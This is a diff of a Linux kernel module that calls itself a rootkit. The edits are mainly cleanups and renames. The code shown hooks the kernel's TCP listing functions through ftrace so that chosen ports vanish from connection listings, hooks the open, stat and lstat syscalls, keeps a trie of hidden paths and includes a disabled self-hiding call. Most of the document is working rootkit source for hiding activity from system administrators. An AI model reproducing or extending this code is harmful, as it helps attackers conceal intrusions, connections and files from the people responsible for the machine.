@@ -17,7 +17,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Anon");
 MODULE_VERSION("1.0");
-MODULE_DESCRIPTION("test rootkit");
+MODULE_DESCRIPTION("rootkit");
 
 // the module parameters
 unsigned long kallsyms;
@@ -30,25 +30,16 @@ unsigned long rootkit_pid;
 module_param(rootkit_pid, ulong, S_IRUGO
 );
 MODULE_PARM_DESC(rootkit_pid,
-"process_access id of the rootkit");
+"process id of the rootkit");
 
 
 asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
-asmlinkage long new_tcp4_seq_show(struct seq_file *seq, void *v)
-{
-    if (v != SEQ_START_TOKEN) {
-        struct inet_sock *is = (struct inet_sock *)v;
 
-//        unsigned short port = htons(8081);
-//        if (port == is->inet_sport || port == is->inet_dport) {
-//            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
-//                    ntohs(is->inet_sport), ntohs(is->inet_dport));
-//            return 0;
-//        }
+asmlinkage long new_tcp4_seq_show(struct seq_file *seq, void *v) {
+    if (v != SEQ_START_TOKEN) {
+        struct inet_sock *is = (struct inet_sock *) v;
 
         if (is_tcp4_port_hidden(ntohs(is->inet_sport))) {
-            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d, %d\n",
-                    ntohs(is->inet_sport), ntohs(is->inet_dport));
             return 0;
         }
 
@@ -58,21 +49,12 @@ asmlinkage long new_tcp4_seq_show(struct seq_file *seq, void *v)
 }
 
 asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
-asmlinkage long new_tcp6_seq_show(struct seq_file *seq, void *v)
-{
-    if (v != SEQ_START_TOKEN) {
-        struct inet_sock *is = (struct inet_sock *)v;
 
-//        unsigned short port = htons(8081);
-//        if (port == is->inet_sport || port == is->inet_dport) {
-//            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
-//                    ntohs(is->inet_sport), ntohs(is->inet_dport));
-//            return 0;
-//        }
+asmlinkage long new_tcp6_seq_show(struct seq_file *seq, void *v) {
+    if (v != SEQ_START_TOKEN) {
+        struct inet_sock *is = (struct inet_sock *) v;
 
         if (is_tcp6_port_hidden(ntohs(is->inet_sport))) {
-            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d, %d\n",
-                    ntohs(is->inet_sport), ntohs(is->inet_dport));
             return 0;
         }
 
@@ -84,7 +66,7 @@ asmlinkage long new_tcp6_seq_show(struct seq_file *seq, void *v)
 
 unsigned long *sys_call_table_addr;
 
-struct syscall_hook_handle* hooks_arr[] = {
+struct syscall_hook_handle *hooks_arr[] = {
         &open_hook,
         &stat_hook,
         &lstat_hook,
@@ -100,9 +82,7 @@ struct syscall_hook_handle* hooks_arr[] = {
 struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", new_tcp4_seq_show, &orig_tcp4_seq_show);
 struct ftrace_hook tcp6_hook = HOOK("tcp6_seq_show", new_tcp6_seq_show, &orig_tcp6_seq_show);
 
-static int __init
-
-rootkit_init(void) {
+static int __init rootkit_init(void) {
     // hiding the module
 //    hide_this_module();
 
@@ -117,12 +97,10 @@ rootkit_init(void) {
     }
 
     // hook tcp handler function
-//    for (int i = 0; i < NO_PORTS; i++)
-//        remove_hidden_tcp_port(i);
     fh_install_hook(&tcp4_hook);
     fh_install_hook(&tcp6_hook);
 
-    initialize_trie();
+    initialize_hidden_paths_trie();
 
     return 0;
 }
@@ -144,7 +122,7 @@ void exit_my_module(void) {
     fh_remove_hook(&tcp4_hook);
     fh_remove_hook(&tcp6_hook);
 
-    finish_trie();
+    finish_hidden_paths_trie();
 
     close_my_channel();
 
@@ -152,9 +130,7 @@ void exit_my_module(void) {
 //    unhide_this_module();
 }
 
-static void __exit
-
-rootkit_exit(void) {
+static void __exit rootkit_exit(void) {
     exit_my_module();
 }
 
